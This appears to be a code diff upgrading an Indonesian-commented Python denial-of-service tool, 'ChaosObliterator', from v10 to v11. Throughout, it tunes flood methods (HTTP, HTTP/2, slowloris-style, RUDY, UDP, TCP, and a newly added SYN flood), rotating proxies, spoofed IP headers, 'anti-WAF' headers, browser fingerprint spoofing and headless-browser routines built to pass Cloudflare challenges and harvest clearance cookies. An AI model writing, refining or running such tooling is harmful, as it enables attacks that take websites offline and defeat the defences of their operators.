@@ -34,20 +34,20 @@ import zlib
 
 # Logging Setup
 logging.basicConfig(
-    level=logging.INFO,
+    level=logging.DEBUG,  # Lebih detail dengan DEBUG
     format="%(asctime)s - [%(levelname)s] %(message)s",
-    handlers=[logging.FileHandler("chaos_obliterator_v10.log"), logging.StreamHandler()]
+    handlers=[logging.FileHandler("chaos_obliterator_v11.log"), logging.StreamHandler()]
 )
 
-class ChaosObliteratorV10:
+class ChaosObliteratorV11:
     def __init__(self, target_l7: str = None, target_l4: str = None, duration: int = 60, threads: int = 30, 
                  methods: List[str] = None, proxy_mode: str = "auto", proxy_list: str = None, intensity: str = "medium"):
         self.target_l7 = target_l7.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0] if target_l7 else None
         self.target_l4 = target_l4 if target_l4 else None
         self.duration = duration
-        self.threads = min(threads, 100)  # Increased max threads
-        self.methods = methods if methods else ["chaoshttp", "ghostloris", "udpchaos", "tcpobliterator", "http2flood", "rudy"]
-        self.intensity = intensity.lower()  # low, medium, high
+        self.threads = min(threads, 100)
+        self.methods = methods if methods else ["chaoshttp", "ghostloris", "http2flood", "rudy", "udpchaos", "tcpobliterator", "synflood"]
+        self.intensity = intensity.lower()
         self.end_time = time.time() + duration
         self.user_agents = [
             f"Mozilla/5.0 (Windows NT {random.uniform(12.0, 18.0):.1f}; Win64; x64) AppleWebKit/537.{random.randint(80, 90)} (KHTML, like Gecko) Chrome/{random.randint(124, 126)}.0.0.0 Safari/537.{random.randint(80, 90)}",
@@ -63,30 +63,31 @@ class ChaosObliteratorV10:
         self.session_headers = {}
         self.cookie_file = "cookies.json"
         self.screenshot_dir = "screenshots"
-        self.proxy_mode = proxy_mode.lower()  # auto, manual, none
+        self.proxy_mode = proxy_mode.lower()
         self.proxy_list = proxy_list.split(",") if proxy_list and proxy_mode == "manual" else []
         self.proxy_pool = self._get_proxy_pool() if proxy_mode != "none" else []
         self.intensity_settings = {
-            "low": {"packets_per_thread": 10, "payload_size": 512, "delay": 0.1},
-            "medium": {"packets_per_thread": 50, "payload_size": 1024, "delay": 0.05},
-            "high": {"packets_per_thread": 100, "payload_size": 2048, "delay": 0.01}
+            "low": {"packets_per_thread": 10, "payload_size": 512, "delay": 0.1, "max_threads_per_method": 5},
+            "medium": {"packets_per_thread": 50, "payload_size": 1024, "delay": 0.05, "max_threads_per_method": 10},
+            "high": {"packets_per_thread": 100, "payload_size": 2048, "delay": 0.01, "max_threads_per_method": 20}
         }
         os.makedirs(self.screenshot_dir, exist_ok=True)
+        self.running = True  # Flag untuk kontrol shutdown
 
     def _get_proxy_pool(self) -> List[str]:
-        """Fetch proxy pool based on mode with enhanced validation."""
+        """Fetch proxy pool dengan validasi lebih ketat."""
         proxies = []
         if self.proxy_mode == "manual":
             proxies = [p.strip() for p in self.proxy_list if p.strip()]
         elif self.proxy_mode == "auto":
             sources = [
-                "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks5&timeout=1000&country=all&ssl=all&anonymity=elite",
+                "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks5&timeout=800&country=all&ssl=all&anonymity=elite",
                 "https://www.free-proxy-list.net/",
                 "https://www.proxy-list.download/api/v1/get?type=https"
             ]
             for source in sources:
                 try:
-                    response = requests.get(source, timeout=5)
+                    response = requests.get(source, timeout=4)
                     if "proxyscrape" in source:
                         proxies.extend(response.text.splitlines())
                     elif "free-proxy-list" in source:
@@ -102,11 +103,11 @@ class ChaosObliteratorV10:
                     logging.warning(f"Gagal mengambil proxy dari {source}")
         valid_proxies = []
         for proxy in proxies:
-            if proxy and len(valid_proxies) < 20:  # Increased proxy pool size
+            if proxy and len(valid_proxies) < 30:  # Pool lebih besar
                 try:
                     start_time = time.time()
-                    test_response = requests.get("https://www.google.com", proxies={"https": proxy}, timeout=1.5)
-                    if test_response.status_code == 200 and (time.time() - start_time) * 1000 < 800:
+                    test_response = requests.get("https://www.google.com", proxies={"https": proxy}, timeout=1)
+                    if test_response.status_code == 200 and (time.time() - start_time) * 1000 < 700:
                         valid_proxies.append(proxy)
                         logging.info(f"Proxy {proxy} ditambahkan ke pool (latensi: {(time.time() - start_time) * 1000:.2f}ms)")
                 except:
@@ -114,37 +115,37 @@ class ChaosObliteratorV10:
         return valid_proxies if valid_proxies else [None]
 
     def _random_payload(self, size: int = 512) -> bytes:
-        """Generate polymorphic payload with compression."""
+        """Generate payload polimorfik dengan kompresi acak."""
         seed = f"{random.randint(10000000000000000, 99999999999999999)}{time.time_ns()}{os.urandom(15).hex()}".encode()
         hash1 = xxhash.xxh3_128(seed).digest()
         hash2 = hashlib.sha3_512(hash1 + os.urandom(13)).digest()
         hash3 = xxhash.xxh64(hash2 + os.urandom(11)).digest()
         hash4 = hashlib.blake2b(hash3 + os.urandom(9), digest_size=32).digest()
         payload = (hash4 + hash3 + hash2 + os.urandom(1))[:size]
-        if random.random() < 0.3:
+        if random.random() < 0.4:
             payload = brotli.compress(payload)
-        elif random.random() < 0.6:
+        elif random.random() < 0.7:
             payload = gzip.compress(payload)
         else:
             payload = zlib.compress(payload)
         return payload
 
     def _random_path(self) -> str:
-        """Generate obfuscated URL paths with balanced complexity."""
+        """Generate URL path sederhana untuk hindari WAF."""
         prefixes = ["v16", "chaos", "obliterator", "nexus", "vortex"]
-        segments = [''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) for _ in range(random.randint(1, 3))]
-        query = f"?matrix={''.join(random.choices(string.hexdigits.lower(), k=16))}&epoch={random.randint(100000000000000, 999999999999999)}"
+        segments = [''.join(random.choices(string.ascii_lowercase + string.digits, k=6)) for _ in range(random.randint(1, 2))]
+        query = f"?matrix={''.join(random.choices(string.hexdigits.lower(), k=12))}&epoch={random.randint(100000000000000, 999999999999999)}"
         return random.choice([
             f"/{random.choice(prefixes)}/{'/'.join(segments)}{query}",
-            "/home", "/about", "/contact", "/"
+            "/home", "/about", "/contact", "/", "/index.html"
         ])
 
     def _random_ip(self) -> str:
-        """Generate spoofed IP for headers."""
+        """Generate IP spoof untuk header."""
         return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
 
     def _random_headers(self) -> dict:
-        """Generate WAF-evading headers with compression support."""
+        """Generate header anti-WAF dengan kompresi."""
         headers = {
             "User-Agent": random.choice(self.user_agents),
             "X-Forwarded-For": self._random_ip(),
@@ -154,15 +155,16 @@ class ChaosObliteratorV10:
             "Connection": "keep-alive",
             "Sec-Ch-Ua": f'"Google Chrome";v="{random.randint(124, 126)}", "Not;A=Brand";v="8", "Chromium";v="{random.randint(124, 126)}"',
             "Sec-Ch-Ua-Mobile": random.choice(["?0", "?1"]),
-            "Sec-Ch-Ua-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"'])
+            "Sec-Ch-Ua-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"']),
+            "Referer": f"https://{self.target_l7}{self._random_path()}" if self.target_l7 else "https://www.google.com"
         }
         headers.update(self.session_headers)
-        if random.random() < 0.95:
-            headers["X-Entropy-Chaos"] = ''.join(random.choices(string.hexdigits.lower(), k=24))
+        if random.random() < 0.9:
+            headers["X-Chaos-Token"] = ''.join(random.choices(string.hexdigits.lower(), k=20))
         return headers
 
     def _save_cookies(self, cookies, response_headers: dict = None):
-        """Save cookies and headers for debugging."""
+        """Simpan cookie dan header untuk debug."""
         data = {"timestamp": time.time(), "cookies": cookies}
         if response_headers:
             data["response_headers"] = dict(response_headers)
@@ -171,7 +173,7 @@ class ChaosObliteratorV10:
         logging.info(f"Cookies disimpan ke {self.cookie_file}")
 
     def _save_screenshot(self, obj, attempt: int, error_type: str):
-        """Save screenshot for debugging with enhanced error handling."""
+        """Simpan screenshot dengan penanganan error lebih baik."""
         screenshot_path = os.path.join(self.screenshot_dir, f"{error_type}_attempt_{attempt}_{int(time.time())}.png")
         try:
             if hasattr(obj, 'screenshot'):
@@ -186,15 +188,15 @@ class ChaosObliteratorV10:
             logging.warning(f"Gagal menyimpan screenshot ke {screenshot_path}: {e}")
 
     def _get_browser_session(self):
-        """Use headless browser to bypass JS challenges with optimized flow."""
-        max_attempts = 3
+        """Bypass JS challenge dengan interaksi lebih realistis."""
+        max_attempts = 4
         attempt = 0
         viewports = [
             {"width": random.randint(1280, 2560), "height": random.randint(720, 1440)},
             {"width": random.randint(1280, 1920), "height": random.randint(720, 1080)},
             {"width": random.randint(1366, 1920), "height": random.randint(768, 1200)}
         ]
-        while attempt < max_attempts:
+        while attempt < max_attempts and self.running:
             proxy = random.choice(self.proxy_pool) if self.proxy_pool and self.proxy_mode != "none" else None
             try:
                 with sync_playwright() as p:
@@ -203,14 +205,16 @@ class ChaosObliteratorV10:
                         user_agent=random.choice(self.user_agents),
                         viewport=random.choice(viewports),
                         java_script_enabled=True,
-                        ignore_https_errors=True
+                        ignore_https_errors=True,
+                        bypass_csp=True
                     )
                     page = context.new_page()
                     
                     # Log network events
                     page.on("response", lambda response: logging.debug(f"Respons jaringan: {response.url} - Status {response.status}"))
+                    page.on("requestfailed", lambda request: logging.debug(f"Request gagal: {request.url} - {request.failure}"))
                     
-                    # Inject spoofing
+                    # Spoofing browser fingerprint
                     page.evaluate("""
                         () => {
                             const getContext = HTMLCanvasElement.prototype.getContext;
@@ -228,6 +232,8 @@ class ChaosObliteratorV10:
                                 }
                                 return getContext.call(this, contextType, attributes);
                             };
+                            Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => Math.floor(Math.random() * 8) + 2 });
+                            Object.defineProperty(navigator, 'deviceMemory', { get: () => Math.floor(Math.random() * 8) + 2 });
                             const fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New'];
                             Object.defineProperty(window, 'FontFace', {
                                 value: function() { return { family: fonts[Math.floor(Math.random() * fonts.length)] }; }
@@ -243,46 +249,46 @@ class ChaosObliteratorV10:
                         }
                     """)
                     
-                    # Navigate with reduced timeout
+                    # Navigasi dengan timeout lebih pendek
                     path = self._random_path()
                     url = f"https://{self.target_l7}{path}"
                     logging.info(f"Percobaan {attempt + 1}: Navigasi ke {url}")
                     try:
-                        page.goto(url, wait_until="domcontentloaded", timeout=8000)
+                        page.goto(url, wait_until="domcontentloaded", timeout=6000)
                     except Exception as e:
                         logging.error(f"Percobaan {attempt + 1}: Page.goto gagal: {e}")
                         self._save_screenshot(page, attempt + 1, "page_goto_error")
                         attempt += 1
                         browser.close()
                         continue
-                    time.sleep(random.uniform(0.3, 1.0))
                     
-                    # Gradual scroll
+                    # Interaksi realistis
+                    time.sleep(random.uniform(0.2, 0.8))
                     for _ in range(2):
-                        page.evaluate("window.scrollBy(0, document.body.scrollHeight * 0.4)")
-                        time.sleep(random.uniform(0.15, 0.3))
+                        page.evaluate("window.scrollBy(0, document.body.scrollHeight * 0.5)")
+                        time.sleep(random.uniform(0.1, 0.2))
                     
-                    # Simulate Bezier curve mouse movement
+                    # Simulasi gerakan mouse Bezier
                     for _ in range(2):
                         x_start = random.randint(100, 800)
                         y_start = random.randint(100, 600)
                         x_end = random.randint(100, 800)
                         y_end = random.randint(100, 600)
-                        x_control1 = x_start + random.randint(-50, 50)
-                        y_control1 = y_start + random.randint(-50, 50)
-                        x_control2 = x_end + random.randint(-50, 50)
-                        y_control2 = y_end + random.randint(-50, 50)
-                        steps = 15
+                        x_control1 = x_start + random.randint(-40, 40)
+                        y_control1 = y_start + random.randint(-40, 40)
+                        x_control2 = x_end + random.randint(-40, 40)
+                        y_control2 = y_end + random.randint(-40, 40)
+                        steps = 10
                         for t in range(steps + 1):
                             t = t / steps
                             x = (1-t)**3 * x_start + 3*(1-t)**2 * t * x_control1 + 3*(1-t) * t**2 * x_control2 + t**3 * x_end
                             y = (1-t)**3 * y_start + 3*(1-t)**2 * t * y_control1 + 3*(1-t) * t**2 * y_control2 + t**3 * y_end
                             page.mouse.move(x, y)
-                            time.sleep(random.uniform(0.008, 0.015))
+                            time.sleep(random.uniform(0.005, 0.01))
                     
-                    # Simulate hover with fallback
+                    # Simulasi hover dan klik
                     try:
-                        elements = page.query_selector_all("a, button, [role='button'], [onclick]")
+                        elements = page.query_selector_all("a, button, [role='button'], [onclick], input[type='submit']")
                         if elements:
                             element = random.choice(elements)
                             blocking = page.evaluate("""
@@ -297,32 +303,32 @@ class ChaosObliteratorV10:
                                 page.evaluate("element => element.dispatchEvent(new MouseEvent('mouseover'))", element)
                             else:
                                 element.scroll_into_view_if_needed()
-                                element.hover(timeout=3000)
-                            time.sleep(random.uniform(0.15, 0.3))
+                                element.hover(timeout=2000)
+                                if random.random() < 0.5:
+                                    element.click(timeout=2000)
+                            time.sleep(random.uniform(0.1, 0.2))
                         else:
-                            logging.warning(f"Percobaan {attempt + 1}: Tidak ada elemen yang bisa dihover.")
+                            logging.warning(f"Percobaan {attempt + 1}: Tidak ada elemen interaktif ditemukan.")
                     except Exception as e:
-                        logging.error(f"Percobaan {attempt + 1}: Hover gagal: {e}")
-                        self._save_screenshot(page, attempt + 1, "hover_timeout")
+                        logging.error(f"Percobaan {attempt + 1}: Interaksi gagal: {e}")
+                        self._save_screenshot(page, attempt + 1, "interaction_error")
                         attempt += 1
                         browser.close()
                         continue
                     
-                    # Simulate drag event
-                    page.mouse.down()
-                    page.mouse.move(random.randint(100, 800), random.randint(100, 600), steps=8)
-                    page.mouse.up()
-                    time.sleep(random.uniform(0.2, 0.4))
+                    # Simulasi input form
+                    if random.random() < 0.4:
+                        try:
+                            if page.query_selector("input[type='text'], input[type='search']"):
+                                page.fill("input[type='text'], input[type='search']", ''.join(random.choices(string.ascii_letters, k=5)))
+                                time.sleep(random.uniform(0.1, 0.2))
+                            if page.query_selector("input[type='submit']"):
+                                page.click("input[type='submit']", timeout=2000)
+                                time.sleep(random.uniform(0.2, 0.4))
+                        except Exception as e:
+                            logging.debug(f"Percobaan {attempt + 1}: Input form gagal: {e}")
                     
-                    # Random interactions
-                    if random.random() < 0.3:
-                        page.reload(wait_until="domcontentloaded", timeout=8000)
-                        time.sleep(random.uniform(0.4, 0.8))
-                    if page.query_selector("input[type='text']"):
-                        page.fill("input[type='text']", ''.join(random.choices(string.ascii_letters, k=6)))
-                        time.sleep(random.uniform(0.15, 0.3))
-                    
-                    # Check page status
+                    # Cek status halaman
                     response = page.evaluate("() => document.readyState")
                     if response != "complete":
                         logging.warning(f"Percobaan {attempt + 1}: Halaman tidak sepenuhnya dimuat.")
@@ -331,21 +337,20 @@ class ChaosObliteratorV10:
                         browser.close()
                         continue
                     
-                    # Check HTTP status and response body
+                    # Cek status HTTP
                     status = page.evaluate("() => window.performance.getEntriesByType('navigation')[0]?.responseStatus || 0")
                     response_body = page.content()[:200]
-                    if status in [403, 429]:
+                    if status in [403, 429, 503]:
                         logging.warning(f"Percobaan {attempt + 1}: HTTP {status} terdeteksi. Respons: {response_body}")
                         self._save_screenshot(page, attempt + 1, "http_error")
                         attempt += 1
                         browser.close()
                         continue
                     
-                    # Get and validate cookies
+                    # Validasi cookie
                     cookies = context.cookies()
                     cf_clearance = any(cookie["name"] == "cf_clearance" for cookie in cookies)
                     cf_bm = any(cookie["name"] == "__cf_bm" for cookie in cookies)
-                    cf_chl = any(cookie["name"].startswith("cf_chl") for cookie in cookies)
                     if not (cf_clearance and cf_bm):
                         logging.warning(f"Percobaan {attempt + 1}: Tidak ada cf_clearance atau __cf_bm. Respons: {response_body}")
                         self._save_cookies(cookies)
@@ -354,10 +359,10 @@ class ChaosObliteratorV10:
                         browser.close()
                         continue
                     
-                    # Validate cookies with test request
+                    # Validasi cookie dengan test request
                     test_headers = self._random_headers()
                     test_headers["Cookie"] = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
-                    test_response = requests.get(f"https://{self.target_l7}", headers=test_headers, proxies={"https": proxy} if proxy else None, timeout=4)
+                    test_response = requests.get(f"https://{self.target_l7}", headers=test_headers, proxies={"https": proxy} if proxy else None, timeout=3)
                     if test_response.status_code != 200:
                         logging.warning(f"Percobaan {attempt + 1}: Validasi cookie gagal, status {test_response.status_code}. Respons: {test_response.text[:200]}")
                         self._save_cookies(cookies, test_response.headers)
@@ -366,9 +371,9 @@ class ChaosObliteratorV10:
                         browser.close()
                         continue
                     
-                    # Check cookie expiry
+                    # Cek masa berlaku cookie
                     for cookie in cookies:
-                        if "expires" in cookie and cookie["expires"] < time.time() + 120:
+                        if "expires" in cookie and cookie["expires"] < time.time() + 180:
                             logging.warning(f"Percobaan {attempt + 1}: Cookie {cookie['name']} kadaluarsa terlalu cepat.")
                             self._save_cookies(cookies, test_response.headers)
                             self._save_screenshot(page, attempt + 1, "cookie_expiry")
@@ -376,7 +381,7 @@ class ChaosObliteratorV10:
                             browser.close()
                             continue
                     
-                    # Store cookies
+                    # Simpan cookie
                     for cookie in cookies:
                         self.cookies.set(cookie["name"], cookie["value"], domain=self.target_l7, path=cookie["path"])
                     
@@ -392,23 +397,24 @@ class ChaosObliteratorV10:
                     return
             except Exception as e:
                 logging.error(f"Playwright gagal: {e}")
-                self._save_screenshot(page, attempt + 1, "playwright_error")
+                self._save_screenshot(page if 'page' in locals() else None, attempt + 1, "playwright_error")
                 attempt += 1
-                browser.close()
+                if 'browser' in locals():
+                    browser.close()
                 continue
         logging.warning("Beralih ke undetected_chromedriver fallback...")
         self._get_browser_session_fallback()
 
     def _get_browser_session_fallback(self):
-        """Fallback to undetected_chromedriver with improved stability."""
-        max_attempts = 3
+        """Fallback ke undetected_chromedriver dengan stabilitas lebih baik."""
+        max_attempts = 4
         attempt = 0
         viewports = [
             {"width": random.randint(1280, 2560), "height": random.randint(720, 1440)},
             {"width": random.randint(1280, 1920), "height": random.randint(720, 1080)},
             {"width": random.randint(1366, 1920), "height": random.randint(768, 1200)}
         ]
-        while attempt < max_attempts:
+        while attempt < max_attempts and self.running:
             proxy = random.choice(self.proxy_pool) if self.proxy_pool and self.proxy_mode != "none" else None
             try:
                 options = uc.ChromeOptions()
@@ -420,6 +426,7 @@ class ChaosObliteratorV10:
                 options.add_argument("--no-sandbox")
                 options.add_argument("--disable-dev-shm-usage")
                 options.add_argument("--disable-blink-features=AutomationControlled")
+                options.add_argument("--window-size=1920,1080")
                 driver = uc.Chrome(options=options, headless=True, use_subprocess=True)
                 
                 # Apply stealth
@@ -429,16 +436,17 @@ class ChaosObliteratorV10:
                     platform="Win32",
                     webgl_vendor="Intel Inc.",
                     renderer="Intel Iris OpenGL Engine",
-                    fix_hairline=True
+                    fix_hairline=True,
+                    run_on_insecure=True
                 )
                 
-                # Navigate
+                # Navigasi
                 path = self._random_path()
                 url = f"https://{self.target_l7}{path}"
                 logging.info(f"Percobaan fallback {attempt + 1}: Navigasi ke {url}")
                 try:
                     driver.get(url)
-                    time.sleep(random.uniform(0.3, 1.0))
+                    time.sleep(random.uniform(0.2, 0.8))
                 except Exception as e:
                     logging.error(f"Percobaan fallback {attempt + 1}: Navigasi gagal: {e}")
                     self._save_screenshot(driver, attempt + 1, "navigation_error_fallback")
@@ -446,32 +454,32 @@ class ChaosObliteratorV10:
                     driver.quit()
                     continue
                 
-                # Gradual scroll
+                # Interaksi realistis
                 for _ in range(2):
-                    driver.execute_script("window.scrollBy(0, document.body.scrollHeight * 0.4)")
-                    time.sleep(random.uniform(0.15, 0.3))
+                    driver.execute_script("window.scrollBy(0, document.body.scrollHeight * 0.5)")
+                    time.sleep(random.uniform(0.1, 0.2))
                 
-                # Simulate Bezier curve mouse movement
+                # Simulasi gerakan mouse
                 for _ in range(2):
                     x_start = random.randint(100, 800)
                     y_start = random.randint(100, 600)
                     x_end = random.randint(100, 800)
                     y_end = random.randint(100, 600)
-                    x_control1 = x_start + random.randint(-50, 50)
-                    y_control1 = y_start + random.randint(-50, 50)
-                    x_control2 = x_end + random.randint(-50, 50)
-                    y_control2 = y_end + random.randint(-50, 50)
-                    steps = 15
+                    x_control1 = x_start + random.randint(-40, 40)
+                    y_control1 = y_start + random.randint(-40, 40)
+                    x_control2 = x_end + random.randint(-40, 40)
+                    y_control2 = y_end + random.randint(-40, 40)
+                    steps = 10
                     for t in range(steps + 1):
                         t = t / steps
                         x = (1-t)**3 * x_start + 3*(1-t)**2 * t * x_control1 + 3*(1-t) * t**2 * x_control2 + t**3 * x_end
                         y = (1-t)**3 * y_start + 3*(1-t)**2 * t * y_control1 + 3*(1-t) * t**2 * y_control2 + t**3 * y_end
                         driver.execute_script(f"document.elementFromPoint({x}, {y}).dispatchEvent(new MouseEvent('mousemove', {{clientX: {x}, clientY: {y}}}))")
-                        time.sleep(random.uniform(0.008, 0.015))
+                        time.sleep(random.uniform(0.005, 0.01))
                 
-                # Simulate hover with fallback
+                # Simulasi hover dan klik
                 try:
-                    elements = driver.find_elements(By.CSS_SELECTOR, "a, button, [role='button'], [onclick]")
+                    elements = driver.find_elements(By.CSS_SELECTOR, "a, button, [role='button'], [onclick], input[type='submit']")
                     if elements:
                         element = random.choice(elements)
                         blocking = driver.execute_script("""
@@ -487,37 +495,32 @@ class ChaosObliteratorV10:
                         else:
                             driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", element)
                             element.click()
-                        time.sleep(random.uniform(0.15, 0.3))
+                        time.sleep(random.uniform(0.1, 0.2))
                     else:
-                        logging.warning(f"Percobaan fallback {attempt + 1}: Tidak ada elemen yang bisa dihover.")
+                        logging.warning(f"Percobaan fallback {attempt + 1}: Tidak ada elemen interaktif ditemukan.")
                 except Exception as e:
-                    logging.error(f"Percobaan fallback {attempt + 1}: Hover gagal: {e}")
-                    self._save_screenshot(driver, attempt + 1, "hover_timeout_fallback")
+                    logging.error(f"Percobaan fallback {attempt + 1}: Interaksi gagal: {e}")
+                    self._save_screenshot(driver, attempt + 1, "interaction_error_fallback")
                     attempt += 1
                     driver.quit()
                     continue
                 
-                # Simulate drag event
-                driver.execute_script("document.elementFromPoint(500, 300).dispatchEvent(new MouseEvent('mousedown'))")
-                driver.execute_script("document.elementFromPoint(600, 400).dispatchEvent(new MouseEvent('mousemove'))")
-                driver.execute_script("document.elementFromPoint(600, 400).dispatchEvent(new MouseEvent('mouseup'))")
-                time.sleep(random.uniform(0.2, 0.4))
+                # Simulasi input form
+                if random.random() < 0.4:
+                    try:
+                        if driver.find_element(By.CSS_SELECTOR, "input[type='text'], input[type='search']"):
+                            driver.find_element(By.CSS_SELECTOR, "input[type='text'], input[type='search']").send_keys(''.join(random.choices(string.ascii_letters, k=5)))
+                            time.sleep(random.uniform(0.1, 0.2))
+                        if driver.find_element(By.CSS_SELECTOR, "input[type='submit']"):
+                            driver.find_element(By.CSS_SELECTOR, "input[type='submit']").click()
+                            time.sleep(random.uniform(0.2, 0.4))
+                    except Exception as e:
+                        logging.debug(f"Percobaan fallback {attempt + 1}: Input form gagal: {e}")
                 
-                # Random interactions
-                if random.random() < 0.3:
-                    driver.refresh()
-                    time.sleep(random.uniform(0.4, 0.8))
-                try:
-                    driver.find_element(By.CSS_SELECTOR, "input[type='text']").send_keys(''.join(random.choices(string.ascii_letters, k=6)))
-                    time.sleep(random.uniform(0.15, 0.3))
-                except:
-                    pass
-                
-                # Get cookies and validate
+                # Validasi cookie
                 cookies = driver.get_cookies()
                 cf_clearance = any(cookie["name"] == "cf_clearance" for cookie in cookies)
                 cf_bm = any(cookie["name"] == "__cf_bm" for cookie in cookies)
-                cf_chl = any(cookie["name"].startswith("cf_chl") for cookie in cookies)
                 if not (cf_clearance and cf_bm):
                     logging.error(f"Percobaan fallback {attempt + 1}: Tidak ada cf_clearance atau __cf_bm.")
                     self._save_cookies(cookies)
@@ -526,10 +529,10 @@ class ChaosObliteratorV10:
                     driver.quit()
                     continue
                 
-                # Validate cookies with test request
+                # Validasi cookie dengan test request
                 test_headers = self._random_headers()
                 test_headers["Cookie"] = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
-                test_response = requests.get(f"https://{self.target_l7}", headers=test_headers, proxies={"https": proxy} if proxy else None, timeout=4)
+                test_response = requests.get(f"https://{self.target_l7}", headers=test_headers, proxies={"https": proxy} if proxy else None, timeout=3)
                 if test_response.status_code != 200:
                     logging.error(f"Percobaan fallback {attempt + 1}: Validasi cookie gagal, status {test_response.status_code}. Respons: {test_response.text[:200]}")
                     self._save_cookies(cookies, test_response.headers)
@@ -538,9 +541,9 @@ class ChaosObliteratorV10:
                     driver.quit()
                     continue
                 
-                # Check cookie expiry
+                # Cek masa berlaku cookie
                 for cookie in cookies:
-                    if "expires" in cookie and cookie["expires"] < time.time() + 120:
+                    if "expires" in cookie and cookie["expires"] < time.time() + 180:
                         logging.error(f"Percobaan fallback {attempt + 1}: Cookie {cookie['name']} kadaluarsa terlalu cepat.")
                         self._save_cookies(cookies, test_response.headers)
                         self._save_screenshot(driver, attempt + 1, "cookie_expiry_fallback")
@@ -548,7 +551,7 @@ class ChaosObliteratorV10:
                         driver.quit()
                         continue
                 
-                # Store cookies
+                # Simpan cookie
                 for cookie in cookies:
                     self.cookies.set(cookie["name"], cookie["value"], domain=self.target_l7, path=cookie["path"])
                 
@@ -564,7 +567,7 @@ class ChaosObliteratorV10:
                 return
             except Exception as e:
                 logging.error(f"Fallback gagal: {e}")
-                self._save_screenshot(None, attempt + 1, "fallback_error")
+                self._save_screenshot(driver if 'driver' in locals() else None, attempt + 1, "fallback_error")
                 attempt += 1
                 if 'driver' in locals():
                     driver.quit()
@@ -573,18 +576,17 @@ class ChaosObliteratorV10:
         self._get_browser_session_cloudscraper()
 
     def _get_browser_session_cloudscraper(self):
-        """Fallback using cloudscraper with improved handling."""
-        max_attempts = 3
+        """Fallback ke cloudscraper dengan penanganan lebih baik."""
+        max_attempts = 4
         attempt = 0
-        while attempt < max_attempts:
+        while attempt < max_attempts and self.running:
             proxy = random.choice(self.proxy_pool) if self.proxy_pool and self.proxy_mode != "none" else None
             try:
                 scraper = cloudscraper.create_scraper()
-                response = scraper.get(f"https://{self.target_l7}{self._random_path()}", proxies={"https": proxy} if proxy else None, timeout=8)
+                response = scraper.get(f"https://{self.target_l7}{self._random_path()}", proxies={"https": proxy} if proxy else None, timeout=6)
                 cookies = response.cookies.get_dict()
                 cf_clearance = "cf_clearance" in cookies
                 cf_bm = "__cf_bm" in cookies
-                cf_chl = any(name.startswith("cf_chl") for name in cookies)
                 if not (cf_clearance and cf_bm):
                     logging.error(f"Percobaan cloudscraper {attempt + 1}: Tidak ada cf_clearance atau __cf_bm. Respons: {response.text[:200]}")
                     self._save_cookies(cookies, response.headers)
@@ -592,10 +594,10 @@ class ChaosObliteratorV10:
                     attempt += 1
                     continue
                 
-                # Validate cookies
+                # Validasi cookie
                 test_headers = self._random_headers()
                 test_headers["Cookie"] = "; ".join([f"{name}={value}" for name, value in cookies.items()])
-                test_response = requests.get(f"https://{self.target_l7}", headers=test_headers, proxies={"https": proxy} if proxy else None, timeout=4)
+                test_response = requests.get(f"https://{self.target_l7}", headers=test_headers, proxies={"https": proxy} if proxy else None, timeout=3)
                 if test_response.status_code != 200:
                     logging.error(f"Percobaan cloudscraper {attempt + 1}: Validasi cookie gagal, status {test_response.status_code}. Respons: {test_response.text[:200]}")
                     self._save_cookies(cookies, response.headers)
@@ -603,16 +605,16 @@ class ChaosObliteratorV10:
                     attempt += 1
                     continue
                 
-                # Check cookie expiry
+                # Cek masa berlaku cookie
                 for name, value in cookies.items():
-                    if name in ["cf_clearance", "__cf_bm"] and response.cookies[name].expires < time.time() + 120:
+                    if name in ["cf_clearance", "__cf_bm"] and response.cookies[name].expires < time.time() + 180:
                         logging.error(f"Percobaan cloudscraper {attempt + 1}: Cookie {name} kadaluarsa terlalu cepat.")
                         self._save_cookies(cookies, response.headers)
                         self._save_screenshot(None, attempt + 1, "cookie_expiry_cloudscraper")
                         attempt += 1
                         continue
                 
-                # Store cookies
+                # Simpan cookie
                 for name, value in cookies.items():
                     self.cookies.set(name, value, domain=self.target_l7, path="/")
                 
@@ -634,10 +636,10 @@ class ChaosObliteratorV10:
         self._get_browser_session_h2()
 
     def _get_browser_session_h2(self):
-        """Fallback to HTTP/2 request with improved stability."""
+        """Fallback ke HTTP/2 dengan stabilitas lebih baik."""
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(4)
+            sock.settimeout(3)
             sock.connect((self.target_l7, 443))
             context = ssl._create_unverified_context()
             sock = context.wrap_socket(sock, server_hostname=self.target_l7)
@@ -649,7 +651,7 @@ class ChaosObliteratorV10:
             h2conn.send_headers(1, headers, end_stream=True)
             sock.sendall(h2conn.data_to_send())
             response = b""
-            while True:
+            while self.running:
                 data = sock.recv(65535)
                 if not data:
                     break
@@ -666,7 +668,6 @@ class ChaosObliteratorV10:
                                 cookie_dict[name] = value
                             cf_clearance = "cf_clearance" in cookie_dict
                             cf_bm = "__cf_bm" in cookie_dict
-                            cf_chl = any(name.startswith("cf_chl") for name in cookie_dict)
                             if cf_clearance and cf_bm:
                                 for name, value in cookie_dict.items():
                                     self.cookies.set(name, value, domain=self.target_l7, path="/")
@@ -686,7 +687,7 @@ class ChaosObliteratorV10:
             logging.error(f"HTTP/2 gagal: {e}")
 
     def _check_environment(self):
-        """Check environment for dependencies."""
+        """Cek lingkungan untuk dependensi."""
         try:
             import playwright
             version = subprocess.check_output(["playwright", "--version"]).decode().strip()
@@ -716,6 +717,11 @@ class ChaosObliteratorV10:
         except:
             logging.warning("cloudscraper tidak terpasang. Jalankan: pip3 install cloudscraper")
         try:
+            import psutil
+            logging.info(f"psutil terdeteksi, versi: {psutil.__version__}")
+        except:
+            logging.warning("psutil tidak terpasang. Jalankan: pip3 install psutil")
+        try:
             os.system("playwright install chromium > /dev/null 2>&1")
             logging.info("Chromium terpasang untuk Playwright.")
         except:
@@ -730,16 +736,16 @@ class ChaosObliteratorV10:
         return True
 
     def _refresh_cookies(self):
